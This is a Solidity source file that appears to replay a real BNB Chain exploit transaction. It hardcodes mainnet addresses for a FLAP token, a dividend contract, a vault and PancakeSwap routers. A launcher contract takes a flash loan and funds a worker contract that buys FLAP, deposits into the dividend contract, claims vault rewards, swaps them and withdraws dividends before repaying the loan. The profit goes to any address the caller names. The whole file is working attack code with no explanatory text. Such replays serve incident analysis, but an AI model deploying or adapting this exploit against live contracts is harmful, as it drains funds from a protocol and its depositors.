// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IDividend, IERC20Like, IPancakeCallee, IPancakePair, IPancakeRouter, IPancakeV3SwapRouter, IVault, IWBNB} from "./Tx767dInterfaces.sol";

contract Tx767dReplayAddresses {
    address internal constant FLAP = 0x8c39F3fdaB6DB66eE796D95F34a12Fdef6Ba7777;
    address internal constant DIVIDEND = 0x500c66c836e7D5dd071234c1445A02F5A8304a95;
    address internal constant VAULT = 0xF59818d53376d9BB6e9B3C0a264E3C610b59843D;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant SLISBNB = 0xB0b84D294e0C75A6abe60171b70edEb2EFd14A1B;
    address internal constant FLASH_PAIR = 0xbC42145d5A574EDe9b8860FCa2A49EB7B239Efa5;
    address internal constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant V3_ROUTER = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;

    uint24 internal constant SLISBNB_POOL_FEE = 100;

    uint256 internal constant FLASH_BORROW_AMOUNT = 11.3 ether;
    uint256 internal constant FLASH_REPAY_AMOUNT = 11_334_002_006_018_054_162;
    uint256 internal constant FLAP_BUY_WBNB = 10 ether;
    uint256 internal constant DIVIDEND_DEPOSIT_WBNB = 1.2 ether;
}

contract Tx767dReplayWorker is Tx767dReplayAddresses {
    address internal immutable launcher;
    address[] internal buyPath;
    address[] internal sellPath;

    constructor(address _launcher) {
        launcher = _launcher;

        buyPath.push(WBNB);
        buyPath.push(FLAP);

        sellPath.push(FLAP);
        sellPath.push(WBNB);

        IWBNB(WBNB).approve(PANCAKE_ROUTER, type(uint256).max);
        IERC20Like(FLAP).approve(PANCAKE_ROUTER, type(uint256).max);
        IWBNB(WBNB).approve(DIVIDEND, type(uint256).max);
        IERC20Like(SLISBNB).approve(V3_ROUTER, type(uint256).max);
    }

    modifier onlyLauncher() {
        require(msg.sender == launcher, "worker: only launcher");
        _;
    }

    function executeAttack() external onlyLauncher {
        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLAP_BUY_WBNB,
            0,
            buyPath,
            address(this),
            block.timestamp + 1
        );

        IDividend(DIVIDEND).deposit(DIVIDEND_DEPOSIT_WBNB);
        IVault(VAULT).claimReward();

        uint256 claimedSlis = IERC20Like(SLISBNB).balanceOf(address(this));
        if (claimedSlis > 0) {
            IPancakeV3SwapRouter(V3_ROUTER).exactInputSingle(
                IPancakeV3SwapRouter.ExactInputSingleParams({
                    tokenIn: SLISBNB,
                    tokenOut: WBNB,
                    fee: SLISBNB_POOL_FEE,
                    recipient: address(this),
                    deadline: block.timestamp + 1,
                    amountIn: claimedSlis,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
        }

        IDividend(DIVIDEND).withdrawDividends();

        uint256 bnbBalance = address(this).balance;
        if (bnbBalance > 0) {
            IWBNB(WBNB).deposit{value: bnbBalance}();
        }

        uint256 flapBalance = IERC20Like(FLAP).balanceOf(address(this));
        if (flapBalance > 0) {
            IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                flapBalance,
                0,
                sellPath,
                address(this),
                block.timestamp + 1
            );
        }

        uint256 wbnbBalance = IERC20Like(WBNB).balanceOf(address(this));
        if (wbnbBalance > 0) {
            require(IERC20Like(WBNB).transfer(launcher, wbnbBalance), "worker: transfer back failed");
        }
    }

    receive() external payable {}
}

contract Tx767dReplayLauncher is Tx767dReplayAddresses, IPancakeCallee {
    Tx767dReplayWorker public immutable worker;

    constructor() {
        worker = new Tx767dReplayWorker(address(this));
    }

    function attack() external {
        IPancakePair(FLASH_PAIR).swap(0, FLASH_BORROW_AMOUNT, address(this), hex"3078");
    }

    function simulateWithoutFlash(uint256 fundingWbnb) external payable {
        if (msg.value > 0) {
            IWBNB(WBNB).deposit{value: msg.value}();
        }

        require(IERC20Like(WBNB).balanceOf(address(this)) >= fundingWbnb, "launcher: insufficient seed");
        require(IERC20Like(WBNB).transfer(address(worker), fundingWbnb), "launcher: seed transfer failed");
        worker.executeAttack();
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external override {
        require(msg.sender == FLASH_PAIR, "launcher: bad callback");
        require(IERC20Like(WBNB).transfer(address(worker), amount1), "launcher: worker funding failed");

        worker.executeAttack();

        require(IERC20Like(WBNB).transfer(FLASH_PAIR, FLASH_REPAY_AMOUNT), "launcher: repay failed");
    }

    function profitWbnb() external view returns (uint256) {
        return IERC20Like(WBNB).balanceOf(address(this));
    }

    function withdrawWbnb(address to) external {
        uint256 bal = IERC20Like(WBNB).balanceOf(address(this));
        require(IERC20Like(WBNB).transfer(to, bal), "launcher: withdraw failed");
    }

    receive() external payable {}
}
